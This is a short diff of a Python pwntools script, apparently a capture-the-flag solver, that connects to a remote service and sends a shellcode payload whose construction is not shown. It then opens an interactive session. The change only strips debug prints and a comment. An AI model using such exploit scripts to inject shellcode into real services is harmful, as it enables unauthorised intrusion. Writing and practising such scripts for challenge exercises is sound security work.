@@ -23,20 +23,17 @@ def make_payload():
 def main():
 
     io = remote(HOST, PORT)
-    g = io.recvuntil(b'Choose an option: \n')
-    print(g)
+    io.recvuntil(b'Choose an option: \n')
     io.sendline(b'4')
 
     payload = make_payload()
-    g = io.recvuntil(b'Enter the size of your shellcode: \n')
-    print(g)
+    io.recvuntil(b'Enter the size of your shellcode: \n')
+    
     io.sendline(str(len(payload)).encode())
 
-    g = io.recvuntil(b'Enter your shellcode: ')
-    print(g)
+    io.recvuntil(b'Enter your shellcode: ')
     io.sendline(payload)
 
-    # read remainder of program output
     io.interactive()
 
 if __name__ == '__main__':
